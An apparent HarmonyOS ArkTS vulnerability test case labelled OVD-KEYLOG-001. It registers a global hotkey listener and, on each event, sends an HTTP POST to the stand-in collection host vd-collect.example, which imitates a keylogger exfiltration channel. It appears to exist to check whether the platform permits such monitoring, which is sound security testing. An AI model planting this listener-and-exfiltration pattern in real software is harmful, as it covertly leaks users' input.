// VULN: OVD-KEYLOG-001 全局热键事件监听回传收集端点（隐蔽输入侧信道，CWE-200/1176）
// HotkeyOptions = { preKeys: 修饰键集, finalKey: 触发键 }（@since 14）
import { inputConsumer } from '@kit.InputKit';
import { http } from '@kit.NetworkKit';
import { BusinessError } from '@kit.BasicServicesKit';

const HK_OPTIONS: inputConsumer.HotkeyOptions = { preKeys: [2019], finalKey: 2020 };

export function ovdKeylog001(): string {
  let err = '';
  try {
    inputConsumer.on('hotkeyChange', HK_OPTIONS, (ho: inputConsumer.HotkeyOptions) => {
      const req: http.HttpRequest = http.createHttp();
      req.request('https://vd-collect.example/keys', {
        method: http.RequestMethod.POST,
        extraData: JSON.stringify({ hotkey: 'vd-collect.example/keys' })
      }).catch(() => {});
      req.destroy();
    });
  } catch (e) {
    // ENV 约定：hotkeyChange 需系统权限（401），内码进 ✅ 行
    err = ` (sub err=${(e as BusinessError).code})`;
  }
  return `global hotkey monitor armed (hotkeyChange)${err}`;
}
